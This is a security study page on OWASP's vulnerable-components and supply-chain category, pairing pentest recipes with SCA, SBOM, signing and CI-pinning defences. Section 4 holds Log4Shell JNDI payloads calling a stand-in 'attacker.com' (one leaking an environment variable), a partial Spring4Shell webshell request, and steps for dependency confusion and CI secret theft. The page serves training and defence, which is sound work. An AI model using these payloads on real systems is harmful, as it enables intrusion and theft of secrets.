# A06:2021 - Vulnerable and Outdated Components

> OWASP Top 10:2021 - A06
> OWASP Top 10:2025 - A03 Software Supply Chain Failures (expanded and renamed)
>
> Using components (libraries, frameworks, CMS, runtimes) with known
> vulnerabilities, or failing to track and update them. In the 2025
> revision, this category is renamed and expanded to cover the entire
> software supply chain: dependencies, build systems, distribution
> channels, and artifact integrity.

---

## Table of Contents

- [1. What Vulnerable Components Are](#1-what-vulnerable-components-are)
- [2. Common Vulnerable Component Classes](#2-common-vulnerable-component-classes)
- [3. Detection Workflow (Pentest)](#3-detection-workflow-pentest)
- [4. Exploitation Recipes (Pentest)](#4-exploitation-recipes-pentest)
- [5. CVE Discovery Tools Reference](#5-cve-discovery-tools-reference)
- [6. Risk Context (AppSec)](#6-risk-context-appsec)
- [7. Root Causes (AppSec)](#7-root-causes-appsec)
- [8. Preventive Controls (AppSec)](#8-preventive-controls-appsec)
- [9. Detection Controls (AppSec)](#9-detection-controls-appsec)
- [10. Verification (AppSec)](#10-verification-appsec)
- [11. OSCP Notes](#11-oscp-notes)
- [12. Production Notes](#12-production-notes)
- [13. References](#13-references)

---

## 1. What Vulnerable Components Are

A vulnerable component is a piece of software used by the
application that has a publicly known security flaw. The flaw is
not in the application's own code - it is in something the
application imports, loads, or runs.

Modern web applications are mostly assembled from components:

- **Libraries:** jQuery, Lodash, Axios, requests, log4j.
- **Frameworks:** Django, Rails, Spring, Laravel, Express, ASP.NET.
- **CMS and plugins:** WordPress, Joomla, Drupal, Magento.
- **Runtimes and servers:** Node.js, Java, PHP, Nginx, Apache, Tomcat.
- **Build tools and CI/CD:** webpack, Maven, Gradle, GitHub Actions.
- **Containers and base images:** Docker base images, Kubernetes add-ons.

Each component has a version. Each version has a set of known
vulnerabilities (CVEs). The application is as vulnerable as the
weakest component in its dependency tree.

**The 2025 expansion.** In OWASP Top 10:2025, this category became
**A03 Software Supply Chain Failures**. The scope widened from
"outdated libraries" to the entire chain:

- The dependency tree (direct and transitive).
- The build pipeline (CI/CD, GitHub Actions, Jenkins).
- The distribution channel (npm, PyPI, Maven Central, Docker Hub).
- The integrity of artifacts (signed packages, SLSA provenance,
  sigstore).

The old name described the symptom. The new name describes the
systemic risk: a single compromised package or pipeline can
propagate to every consumer.

**Why this matters:**

- **Volume.** The average web application has hundreds of direct
  and thousands of transitive dependencies. Tracking them manually
  is impossible.

- **Velocity.** A new CVE can be published for a component you use
  every day. The window between disclosure and exploitation is
  often hours, not weeks.

- **Reach.** A single compromised dependency (event-stream,
  colors.js, ua-parser-js, log4j) can affect thousands of
  applications at once.

---

## 2. Common Vulnerable Component Classes

Not all components fail in the same way. The most common classes:

### 2.1 Outdated Libraries

A library with a newer version that fixes a known CVE is still
pinned to the vulnerable one.

**Examples:**

- Log4j 2.0-beta9 through 2.14.1: CVE-2021-44228 (Log4Shell),
  RCE via JNDI lookup in a log message.
- Spring Framework 5.3.0-5.3.17, 5.2.0-5.2.19: CVE-2022-22965
  (Spring4Shell), RCE via data binding.
- jQuery before 3.5.0: CVE-2020-11022 / CVE-2020-11023, XSS via
  HTML manipulation.
- Apache Commons Text 1.5-1.9: CVE-2022-42889 (Text4Shell), RCE
  via string interpolation.

### 2.2 Unpatched Frameworks

The framework version is pinned and the team has not applied
security patches.

**Examples:**

- Django before 3.2.15: CVE-2022-36359, SQL injection via
  `QuerySet.annotate()`.
- Rails before 6.0.3.7: CVE-2022-32224, deserialization RCE.
- Laravel before 8.83.27 / 9.5.0: CVE-2023-0425, RCE via
  unserialize.
- Express with vulnerable middleware: `body-parser` before 1.20.3
  (DoS), `multer` before 1.4.5-lts.1 (DoS).

### 2.3 Vulnerable CMS and Plugins

WordPress, Joomla, Drupal, Magento, PrestaShop - and the plugin
ecosystem around each - are a high-yield target because the plugin
code quality varies widely.

**Examples:**

- WordPress plugin "Elementor Pro" 3.11.6: CVE-2023-48777,
  arbitrary file upload to RCE.
- WordPress plugin "WooCommerce Payments" 4.8.0-5.6.1:
  CVE-2023-28121, authentication bypass via forged header.
- Joomla 4.0.0-4.2.7: CVE-2023-23752, unauthenticated information
  disclosure.
- Drupal 7 before 7.58: CVE-2018-7600 (Drupalgeddon2), RCE via
  Form API.

See `05 CMS/` for the full CMS exploitation workflow.

### 2.4 Transitive Dependencies

You do not import them directly, but a library you use does. A
vulnerable transitive dependency is the hardest class to track.

**Examples:**

- `log4j-core` pulled in by a logging framework you use.
- An old `lodash` version pinned by a frontend build tool.
- A vulnerable `openssl` in a base Docker image.

**Why it is hard:** developers see the top-level dependencies, but
a package manager can pull in hundreds of transitive packages.
Tracking them requires automated scanning (section 8).

### 2.5 End-of-Life (EOL) Software

A component that no longer receives security updates. Even if no
CVE is currently open, the next CVE will not be patched.

**Examples:**

- Python 2.7 (EOL 2020-01-01).
- PHP 7.4 (EOL 2022-11-28).
- Node.js 14 (EOL 2023-04-30).
- AngularJS 1.x (EOL 2021-12-31).
- .NET Framework 4.5.2-4.6.1 (EOL 2022-04-26).

### 2.6 Vulnerable Runtime or Server

The web server or language runtime itself has a known CVE.

**Examples:**

- Apache HTTP Server 2.4.49-2.4.50: CVE-2021-41773 / CVE-2021-42013,
  path traversal to RCE.
- Nginx 1.20.0: CVE-2021-23017, DNS resolver off-by-one.
- Tomcat before 9.0.63: CVE-2022-34305, XSS via form.
- IIS with vulnerable WebDAV configuration.

See `04 Servers/` for server-specific exploitation.

### 2.7 Vulnerable Container Base Images

A Docker image is built on a base image (`node:14`, `python:3.8`,
`ubuntu:18.04`). If the base is outdated, every container built on
it inherits the CVEs.

**Common mistakes:**

- Using `:latest` tags with no version pinning.
- Using official images that are months or years old.
- Installing additional packages in the Dockerfile without pinning.

### 2.8 CI/CD Pipeline Components

GitHub Actions, GitLab CI runners, Jenkins plugins, and third-party
build steps are also components with their own CVEs and supply
chain risks.

**Examples:**

- `tj-actions/changed-files` (2025): tag rewrite allowed
  exfiltration of secrets from thousands of repos.
- Jenkins plugin vulnerabilities: dozens per year.
- npm `postinstall` scripts: arbitrary code execution at install
  time.

This is where the 2025 name (Software Supply Chain Failures)
becomes concrete. The build pipeline is a target, not just the
runtime.

---

## 3. Detection Workflow (Pentest)

Finding vulnerable components is a four-step process: fingerprint,
identify version, look up CVEs, verify exploitability.

### 3.1 Fingerprint the Stack

Before you can look up CVEs, you need to know what is running.

**Passive (from the client side):**

- HTTP response headers: `Server`, `X-Powered-By`, `X-AspNet-Version`,
  `X-Generator`.
- HTML meta tags: `<meta name="generator" content="WordPress 6.4.2">`.
- JavaScript file paths: `/wp-content/plugins/...`,
  `/static/js/main.abc123.js`.
- Cookie names: `wordpress_logged_in_*`, `PHPSESSID`, `JSESSIONID`,
  `ASP.NET_SessionId`.
- Error pages: stack traces, framework-specific 404 pages.

**Active (probing):**

- Request known paths: `/wp-login.php`, `/administrator/`,
  `/wp-json/wp/v2/`, `/actuator/info`.
- Send malformed input and observe framework-specific errors.
- Check `/robots.txt`, `/sitemap.xml`, `/.well-known/`.

**Tools:**

- `whatweb` - fingerprints CMS, frameworks, servers from headers and
  HTML.
- `wappalyzer` (browser extension or CLI) - same goal, larger
  signature database.
- `nuclei -t technologies/` - template-based tech detection.
- `nmap -sV --version-all` - service version detection for
  server-side components.

### 3.2 Identify the Exact Version

Fingerprinting gives you the component; version identification gives
you the CVE. The version matters: a single patch difference can move
you from vulnerable to safe.

**Where to look:**

- HTML comments: `<!-- WordPress 6.4.2 -->`.
- JS/CSS asset paths with version: `/jquery-3.6.0.min.js`,
  `/static/main.4a3b2c1.js`.
- `readme.html`, `changelog.txt`, `VERSION` files.
- `package.json`, `composer.json` if exposed.
- Error messages that include version numbers.

**When version is hidden:**

- Fingerprint by behavior: a CVE that only affects 3.4.0 produces a
  distinctive response.
- Check the file hash: if the app serves `/js/vendor.js`, the SHA-256
  of that file matches a specific version.
- Use `retire.js` (frontend libraries) or `wpscan --detection-mode
  aggressive` (WordPress).

### 3.3 Look Up CVEs

With the component and version, search:

1. **NVD** (https://nvd.nist.gov/) - official CVE database.
2. **MITRE CVE** (https://cve.mitre.org/) - the canonical list.
3. **GitHub Advisory Database**
   (https://github.com/advisories) - strong for npm, PyPI, Go.
4. **Exploit-DB** (https://www.exploit-db.com/) - working exploits.
5. **Vendor security advisories** - WordPress, Drupal, Apache, etc.
6. **Packet Storm**, **CVE Details** - secondary sources.

**Search pattern:** `<component> <version> CVE` in a search engine is
fast. Cross-check against NVD before acting.

### 3.4 Verify Exploitability

A CVE entry tells you the version is vulnerable. It does NOT tell
you that the vulnerability is exploitable in this specific
deployment.

**Before running an exploit:**

- Check the vulnerable code path is reachable (e.g. a Log4Shell
  CVE requires the app to log attacker-controlled input).
- Check the affected configuration (some CVEs only apply if a
  specific module is enabled).
- Check the exploit's prerequisites (auth required? specific
  endpoint?).
- Run in a safe way: first a proof-of-concept that only reads
  (e.g. `nslookup` to a collaborator), not a full RCE payload.

### 3.5 A Practical Workflow

```text
1. nmap -sV target          -> identify services
2. whatweb target           -> identify CMS/frameworks
3. wpscan / nuclei -t tech  -> enumerate versions
4. searchsploit <name> <ver> -> find exploits
5. search NVD / GitHub advisory
6. verify the vulnerable path is reachable
7. run a PoC, then the exploit
```

---

## 4. Exploitation Recipes (Pentest)

Each recipe follows the same shape: identify the component, find the
CVE, run the exploit.

### 4.1 Log4Shell (CVE-2021-44228)

**Component:** Apache Log4j 2.0-beta9 through 2.14.1.

**Recipe:**

1. Identify that the target uses Java and something that logs user
   input (search field, User-Agent, form fields).
2. Start a listener (LDAP/RMI) or use a public collaborator
   (`interactsh`, `Burp Collaborator`).
3. Send a payload in any user-controlled field:

```text
${jndi:ldap://attacker.com/a}
${jndi:ldap://${env:USER}.attacker.com/a}
```

4. Watch for a DNS/HTTP callback from the target.
5. If callback received, escalate to code execution via a JNDI
   exploit server (`marshalsec` + a malicious class).

**Note:** this is one of the highest-impact CVEs in history. Many
OSCP-like boxes use it directly.

### 4.2 Spring4Shell (CVE-2022-22965)

**Component:** Spring Framework 5.3.0-5.3.17, 5.2.0-5.2.19.

**Recipe:**

1. Identify Spring (headers, error pages, `/actuator` endpoints).
2. Send a POST with `class.module.classLoader.*` parameters to
   modify Tomcat's logging configuration:

```text
POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded

class.module.classLoader.resources.context.parent.pipeline.first.pattern=...
```

3. Write a JSP webshell to a web-accessible directory.
4. Access the webshell.

### 4.3 Drupalgeddon2 (CVE-2018-7600)

**Component:** Drupal 7 before 7.58, 8.x before 8.3.9, 8.4.x before
8.4.6, 8.5.x before 8.5.1.

**Recipe:**

1. Identify Drupal: `/CHANGELOG.txt`, `/core/CHANGELOG.txt`,
   `X-Generator` header.
2. Run the public PoC (e.g. `drupalgeddon2.py` from Exploit-DB).
3. The exploit uses the Form API to inject a `#post_render` callback
   that executes a command.
4. Typical payload: reverse shell to attacker.

### 4.4 WordPress Plugin RCE

**Component:** depends on the plugin. Example: Elementor Pro 3.11.6
(CVE-2023-48777).

**Recipe:**

1. Enumerate plugins with `wpscan --enumerate ap` or by requesting
   `/wp-content/plugins/<name>/readme.txt`.
2. Identify version from `readme.txt` or asset paths.
3. Search for CVE of that plugin + version.
4. If a public PoC exists (e.g. a Python script or a Metasploit
   module), run it.
5. If no public PoC, read the advisory and write a minimal exploit.

See `05 CMS/WordPress.md` for the full workflow.

### 4.5 Dependency Confusion

**Component:** any internal package name that is also present in a
public registry.

**Recipe (attacker side):**

1. Identify internal package names. Sources: leaked
   `package.json` / `requirements.txt` / `pom.xml`, error
   messages, GitHub repos, job postings.
2. Publish a package with the same name to a public registry
   (npm, PyPI) with a higher version number.
3. If the build system prefers the public registry for that name,
   the malicious package is fetched and installed.
4. The `postinstall` script runs arbitrary code on the build
   server, potentially leaking CI secrets.

**Recipe (pentest view):**

1. Check if the target's build logs or public repos leak internal
   package names.
2. Verify the internal name is unclaimed on the public registry.
3. Report as a finding: "name is squattable, dependency confusion
   is possible".

### 4.6 CI/CD Pipeline Exploitation

**Component:** GitHub Actions, GitLab CI, Jenkins.

**Recipe (tag rewrite):**

1. A workflow uses `uses: some-action@v1` (a tag, not a SHA).
2. The action owner (or an attacker who compromises the action)
   re-points the tag to a malicious commit.
3. The next CI run executes the malicious code.
4. Secrets in the CI environment are exfiltrated.

**Prevention:** see section 8 (pin actions to SHA).

---

## 5. CVE Discovery Tools Reference

Quick reference for tools that help find, prioritize, and exploit
vulnerable components.

### 5.1 Fingerprinting

| Tool | Target | Notes |
|------|--------|-------|
| `whatweb` | General | Headers, meta, JS, cookies |
| `wappalyzer` | General | Browser ext. + CLI, large DB |
| `nuclei -t technologies` | General | Template-based |
| `wpscan` | WordPress | The standard |
| `joomscan` | Joomla | Joomla-specific |
| `droopescan` | Drupal, SilverStripe | CMS scanner |
| `retire.js` | Frontend JS | Detects vulnerable JS libs |

### 5.2 CVE Lookup

| Source | URL | Notes |
|--------|-----|-------|
| NVD | https://nvd.nist.gov/ | Canonical CVE data, CVSS scores |
| MITRE CVE | https://cve.mitre.org/ | The CVE list itself |
| GitHub Advisory | https://github.com/advisories | Strong for ecosystems |
| Exploit-DB | https://www.exploit-db.com/ | Working exploits |
| Packet Storm | https://packetstormsecurity.com/ | Advisories + tools |
| CVE Details | https://www.cvedetails.com/ | Historical data |

### 5.3 Local Search

| Tool | Notes |
|------|-------|
| `searchsploit <name> <ver>` | Offline Exploit-DB search (Kali) |
| `nuclei -t cves/` | CVE templates (Nuclei community) |
| `msfconsole; search <name>` | Metasploit module search |

### 5.4 SCA (Software Composition Analysis)

Used by AppSec teams to scan dependency trees. See section 8.

| Tool | Ecosystem |
|------|-----------|
| `npm audit` | npm |
| `pip-audit` | PyPI |
| `bundler-audit` | Ruby gems |
| `govulncheck` | Go |
| `trivy` | Containers, general |
| `grype` | Containers, general |
| `snyk` | Multi-ecosystem (commercial) |
| `dependabot` | GitHub-native |

---

## 6. Risk Context (AppSec)

**Why this is a top-10 category.** The 2021 name was "Vulnerable and
Outdated Components". The 2025 name is "Software Supply Chain
Failures". The change reflects what the data showed: the problem is
not only unpatched libraries, but the entire chain that produces and
delivers software.

**Real-world pattern.** A typical supply chain failure looks like
this:

1. A widely-used package adds a new maintainer, or an existing
   maintainer's account is compromised.
2. A malicious version is published. It may include a `postinstall`
   script, a backdoor, or an exfiltration routine.
3. Every project that depends on the package, directly or
   transitively, pulls the malicious version on the next build.
4. The attacker gains code execution in thousands of build
   environments and, through CI secrets, in production.

**Why scanners miss it.** Traditional DAST and SAST tools scan the
application's own code. They do not look at the dependency tree,
the build pipeline, or the artifact integrity. A vulnerable
dependency is not a "bug" in the code - it is a property of the
supply chain.

**AppSec relevance.** This is the category where SCA, SBOM, and CI/CD
hardening have the highest ROI. The controls are process-level, not
code-level. A team that cannot answer "what versions of what
components are in production right now?" cannot defend this
category.

---

## 7. Root Causes (AppSec)

**1. No inventory of components.** The team does not know what is in
the dependency tree. Without an SBOM (Software Bill of Materials),
there is no way to answer "are we affected by CVE-X?".

**2. Pinning without updating.** Dependencies are pinned to a known
version for reproducibility, but the pin is never revisited. The
app is stable and vulnerable.

**3. Transitive dependency blindness.** Tools show direct
dependencies. Transitive dependencies (which can be 90% of the tree)
are invisible without SCA.

**4. No automated update process.** Updates are manual, ad-hoc, and
compete with feature work. They lose.

**5. Build pipeline treated as trusted.** The CI/CD pipeline is
assumed to be safe. Actions are pinned to tags, not SHAs. Build
secrets are broadly available. Third-party build steps run with the
same privileges as the main build.

**6. No artifact signing.** There is no way to verify that the
package you downloaded is the one the author published. Typosquatting
and dependency confusion succeed because there is no signature to
check.

**7. No SBOM, no incident response.** When a new CVE lands (Log4Shell,
Spring4Shell), the first question is "are we affected?". Without an
SBOM, the answer takes days instead of seconds.

---

## 8. Preventive Controls (AppSec)

**Software Composition Analysis (SCA).** Automated scan of the
dependency tree on every commit and every build. Tools: `npm audit`,
`pip-audit`, `bundler-audit`, `govulncheck`, `trivy`, `grype`,
`snyk`, `dependabot`. The output is a list of vulnerable
dependencies with severity and remediation.

**SBOM (Software Bill of Materials).** A machine-readable list of
every component and version in the artifact. Formats: CycloneDX,
SPDX. Generate on every build. Keep for the lifetime of the release.
When a new CVE lands, query the SBOM: "do we have this component,
and in what version?"

**Dependency pinning with update cadence.** Pin exact versions for
reproducibility, but schedule updates. Dependabot, Renovate, or an
equivalent tool opens PRs on a schedule. Review and merge quickly.

**Lock files committed.** `package-lock.json`, `yarn.lock`,
`Pipfile.lock`, `poetry.lock`, `Gemfile.lock`, `go.sum` - commit
them. They pin the full transitive tree. Without a lock file, every
build can pull a different version.

**Signed artifacts and provenance.** Sign packages (sigstore, GPG).
Verify signatures at install time. Adopt SLSA (Supply-chain Levels
for Software Artifacts) to establish provenance: who built this
artifact, from what source, with what build steps.

**Pin CI actions to full SHA.** Never `uses: action@v1`. Always
`uses: action@<40-char SHA>`. A tag can be re-pointed; a SHA cannot.

**Least-privilege CI secrets.** CI secrets are scoped to the jobs
that need them. No global secrets. No secrets in PRs from forks.

**Private registry with namespace control.** For internal packages,
use a private registry and claim the namespace on the public
registry (defense against dependency confusion). Alternatively,
configure the package manager to prefer the private registry for
known internal names.

**EOL tracking.** Maintain a list of components and their
end-of-life dates. Plan migrations before EOL, not after.

---

## 9. Detection Controls (AppSec)

**SCA alerts in CI.** Block the build on critical CVEs, warn on
high/medium. The threshold is a policy decision.

**SBOM diffing.** On every release, compare the SBOM to the previous
one. New components, version changes, and removed components are all
signals.

**Dependency change alerts.** A PR that adds a new dependency is a
review gate. An unexpected dependency change in a lock file is a
red flag.

**Registry monitoring.** Subscribe to security advisories for the
registries you use (npm, PyPI, Maven, Go). When a malicious package
is reported, check your lock files immediately.

**CI/CD anomaly detection.** Alert on: new actions in workflows,
actions pinned to tags (not SHA), unusual outbound traffic from the
runner, secrets accessed by jobs that did not need them before.

**Artifact signature verification logs.** If signatures are enforced,
log every failed verification. A failed signature is either a bug or
an attack.

---

## 10. Verification (AppSec)

**Test the SCA coverage.** Pick a known-vulnerable version of a
common library, add it to a test branch, and verify SCA flags it.
If it does not, the SCA is not working.

**Test the SBOM.** Generate the SBOM for a release. Verify it lists
all direct and transitive dependencies. Query it for a CVE that
you know applies - the answer should be immediate.

**Test the CI pinning.** Audit all workflow files. Every `uses:`
should be a SHA, not a tag. Automate this check.

**Test the dependency confusion defense.** Verify that internal
names are claimed on the public registry, or that the package
manager is configured to prefer the private registry.

**ASVS mapping.** Relevant ASVS 4.0.3 chapters: V14.2 (Dependency),
V14.3 (Unintended Security Disclosure), V1.1 (Secure SDLC), V1.14
(Secure Build).

**OWASP resources for verification:**

- OWASP ASVS: https://owasp.org/www-project-application-security-verification-standard/
- OWASP Dependency-Check: https://owasp.org/www-project-dependency-check/
- OWASP CycloneDX: https://cyclonedx.org/
- OWASP Software Component Verification Standard: https://owasp.org/www-project-software-component-verification-standard/
- OWASP Cheat Sheet - Vulnerable Dependency Management: https://cheatsheetseries.owasp.org/cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html

---

## 11. OSCP Notes

> [!IMPORTANT]
> OSCP report: for a vulnerable-component exploit, screenshot the
> version fingerprint (header, file path, or banner) and the exploit
> output. The report must show how you identified the component and
> version.

Key patterns for OSCP:

- WordPress, Joomla, Drupal are the highest-yield targets. Always
  run `wpscan` / `joomscan` / `droopescan` if the CMS is identified.
- If a web app uses a Java stack, check for Log4Shell / Spring4Shell.
  These CVEs are common on OSCP-like boxes.
- Check HTTP headers for `X-Powered-By`, `Server` - they leak
  versions.
- `searchsploit <component> <version>` is faster than a browser search.
- If no public exploit exists, read the advisory and write a minimal
  PoC. Many OSCP boxes use CVEs without public Metasploit modules.

---

## 12. Production Notes

- **You cannot defend what you cannot inventory.** SBOM is the
  foundation. Without it, incident response is guesswork.
- **Automate SCA in CI.** Manual dependency review does not scale.
- **Update on a schedule, not on a crisis.** Dependabot/Renovate plus
  a weekly review cycle beats emergency patching.
- **Pin CI actions to SHA.** Tags can be rewritten; SHAs cannot.
- **Sign artifacts.** Adopt sigstore or an equivalent. Verify at
  install time.
- **Claim your namespaces.** Register your internal package names on
  public registries to prevent dependency confusion.
- **Track EOL.** A component past EOL is a future incident.
- **Treat the build pipeline as production.** It has the same
  privileges as production in many organizations. Harden it the same
  way.

---

## 13. References

**OWASP:**

- OWASP Top 10:2021 - A06 - https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/
- OWASP Top 10:2025 - A03 (Software Supply Chain Failures) - https://owasp.org/Top10/2025/
- OWASP Dependency-Check - https://owasp.org/www-project-dependency-check/
- OWASP CycloneDX - https://cyclonedx.org/
- OWASP Software Component Verification Standard - https://owasp.org/www-project-software-component-verification-standard/
- OWASP Cheat Sheet - Vulnerable Dependency Management - https://cheatsheetseries.owasp.org/cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html

**Supply chain standards and tools:**

- SLSA (Supply-chain Levels for Software Artifacts) - https://slsa.dev/
- sigstore (artifact signing) - https://www.sigstore.dev/
- GitHub Advisory Database - https://github.com/advisories
- NVD - https://nvd.nist.gov/
- Exploit-DB - https://www.exploit-db.com/

**Notable incidents (for context):**

- Log4Shell (CVE-2021-44228) - Log4j RCE, December 2021.
- event-stream (2018) - malicious npm package targeting Copay.
- ua-parser-js (2021) - compromised npm package with crypto miner.
- tj-actions/changed-files (2025) - GitHub Actions tag rewrite.

**Internal cross-references:**

- [A01 - Broken Access Control](./A01-Broken-Access-Control.md)
- [A04 - Insecure Design](./A04-Insecure-Design.md)
- [2021-vs-2025.md](./2021-vs-2025.md)
- [README.md](./README.md)
- [05 CMS/WordPress.md](../05%20CMS/WordPress.md)
- [04 Servers/](../04%20Servers/)

---

*File version: 2026-10-13 (pass 73, W3.3).*
